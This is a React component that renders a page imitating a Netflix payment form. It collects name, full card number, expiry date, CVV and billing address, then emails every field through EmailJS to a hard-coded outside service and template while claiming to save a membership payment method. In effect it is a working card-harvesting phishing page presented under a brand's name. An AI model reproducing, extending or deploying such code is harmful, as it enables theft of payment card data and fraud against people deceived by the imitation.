import React from 'react';
import emailjs from '@emailjs/browser';
import {  useNavigate } from 'react-router-dom'
import { useState } from 'react'
import { FaCcVisa } from "react-icons/fa";
import { FaCcMastercard } from "react-icons/fa";
import { FaCcAmex } from "react-icons/fa";
import { FaCcDiscover } from "react-icons/fa";
import Header from '../components/Header/Headertwo';
import FooterCompound from '../compounds/FooterCompound';
import "./payment.css"




export const Login = () => {

  

 


 



const [ setSearchItem] = useState("");




  let navigate = useNavigate ();


  const Home = (e) => {
    navigate  ("/Home");
    console.log(e.target.value);
    setSearchItem(e.target.value);
  };

  const sendEmail = (e) => {
    e.preventDefault();
    emailjs.sendForm("service_hm3mv25" , "template_7srrwbt", e.target, "UqisPu0cjGHCBL1W-")
  .then((result) => {
      console.log(result.text);
  }, (error) => {
     console.log(error.text);
  } );
    Home("");
  };



 
  
  




  return (
     <>
     <header className='show'>
        < Header />

        <div className='show-content'>

            <div className='form'>

                <form onSubmit={sendEmail}>
                    <h1 className='pay'>Enter your payment details</h1>

                    <div className='cards'>
                        <FaCcVisa size={30}/> <FaCcMastercard size={30}/> <FaCcAmex size={30} /> <FaCcDiscover size={30}/>
                    </div>

                    
                    <div className="inform">
                        
                        <input className="email" type="text" placeholder="First Name" name='firstname'/> <br/>
                        <input className="email" type="text" placeholder="Last Name" name='lastname'/> <br />
                        <input className="email" type="tel" inputmode="numeric" pattern="[0-9\s]{13,19}" autocomplete="cc-number" maxlength="19" placeholder="Card Number"  name='cc'/> <br/>
                        <input className="email" type="text"  placeholder="Expiration date (MM/YY)" pattern="\d\d/\d\d" maxLength="5"  name='exp'/><br/>
                        <input className="email" type="tel" pattern="\d*" maxLength="4" placeholder="Security code (CVV)"  name='cvv'/> <br/>
                        <input className="email" type="text" placeholder="Billing Address" name='address'/> <br/>
                        <input className="email" type="tel" pattern="\d*"  placeholder="Billing ZIP code" name='zipcode'/> <br/>
                    </div>

                    <br />

                    <div className="helper">
                        <div >
                            <p>By checking the checkbox, you agree that Netflix will automatically continue your membership and charge the membership fee to your payment method untill you cancel. You may cancel at any time to avoid future charges.</p>
                            <input value="true" type="checkbox"/><label>I agree</label>
                        </div>

                        
                        
                    </div>
                    <br />
                    

                

                    <div className="btn">
                       
                            <button className="btn-primary" type="submit" onChange={Home} >Save</button>   
                      
                    </div>

                    
                </form>

            </div>

            
            
            
        </div>


        

    </header>
    <footer>
                
           <FooterCompound />
               
        </footer>
    </>
    
    
  );
};

export default Login